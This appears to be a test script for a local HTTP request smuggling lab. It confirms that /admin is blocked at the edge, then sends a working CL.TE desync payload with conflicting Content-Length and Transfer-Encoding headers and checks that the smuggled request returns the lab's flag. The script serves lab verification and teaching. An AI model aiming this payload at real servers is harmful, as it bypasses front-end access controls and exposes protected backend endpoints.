"""Self-check for the HTTP request smuggling lab.

Asserts the CL.TE desync is live: /admin is 403 at the edge, but a smuggled
request delivers the backend flag through the edge. Exits non-zero on failure.

  python3 tests/verify_desync.py [host] [port]     # default 127.0.0.1 9092
"""
import re
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9092


def send_raw(payload, read_timeout=8):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(read_timeout)
    s.connect((HOST, PORT))
    s.sendall(payload)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    s.close()
    return data


def first_line(resp):
    return resp.split(b"\r\n", 1)[0].decode("latin-1", "replace") if resp else "(none)"


def main():
    control = send_raw(b"GET /admin HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    assert b"403" in control, f"expected 403 at edge for /admin, got {first_line(control)}"
    assert b"REDAMON_HRS{" not in control, "edge leaked the flag on a direct request"

    smuggled = b"GET /admin HTTP/1.1\r\nX-Ignore: x"
    body = b"0\r\n\r\n" + smuggled
    poison = (
        b"POST / HTTP/1.1\r\nHost: x\r\n"
        + f"Content-Length: {len(body)}\r\n".encode()
        + b"Transfer-Encoding: chunked\r\n\r\n" + body
    )
    send_raw(poison)
    time.sleep(0.3)
    follow = send_raw(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    m = re.search(rb"REDAMON_HRS\{[^}]*\}", follow)
    assert m, f"CL.TE smuggle did not return the flag; follow-up was {first_line(follow)}"
    print("OK: CL.TE desync confirmed, flag via edge:", m.group(0).decode())


if __name__ == "__main__":
    main()
